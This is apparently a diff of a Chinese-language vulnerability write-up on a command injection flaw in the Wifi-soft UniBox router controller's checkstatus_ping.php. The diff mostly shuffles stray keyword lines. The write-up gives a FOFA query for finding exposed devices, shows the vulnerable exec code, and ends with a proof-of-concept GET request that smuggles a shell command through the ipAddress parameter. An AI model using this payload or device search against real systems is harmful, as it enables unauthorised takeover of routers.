@@ -8,6 +8,8 @@ asset_dir: embedded-base64
 
 Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/network/checkstatus_ping.php` 受[命令注入](https://mrxn.net/tag/rce)漏洞的影响。未授权的攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个路由器。
 
+网络设备
+
 # 影响版本
 
 # fofa语法
@@ -15,14 +17,6 @@ Wifi-soft UniBox controller [路由器](#)产品中存在一个致命漏洞，`/
 > `body="Unibox" && body="Controller" || body="www.wifi-soft.com"`
 
 # 漏洞分析
-
-深入探索
-
-ping
-
-漏洞预警服务
-
-网络安全培训
 
 直接看 `/network/checkstatus_ping.php` 的业务实现造成漏洞的关键部分如下
 
@@ -44,14 +38,6 @@ function ping($ipAddress) {
 $response = ping($ipAddress);
 ```
 
-深入探索
-
-网络安全会议
-
-SQL注入检测工具
-
-企业安全咨询
-
 直接将 `ipAddress` 的值拼接进 `exec` 命令中执行，无任何过滤和校验，因此造成[命令执行](https://mrxn.net/tag/rce)漏洞。
 
 # 漏洞复现
@@ -60,7 +46,7 @@ SQL注入检测工具
 
 > 支持cookie获取参数，注意检测点，别漏
 >
-> 网络设备
+> 网络监控与管理
 
 ```
 GET /network/checkstatus_ping.php?ipAddress=;set>11.txt; HTTP/1.1
@@ -73,4 +59,4 @@ Host: unibox.mrxn.net
 
 成功获得 `set` 命令执行的结果
 
-网络监控与管理
+漏洞利用分析
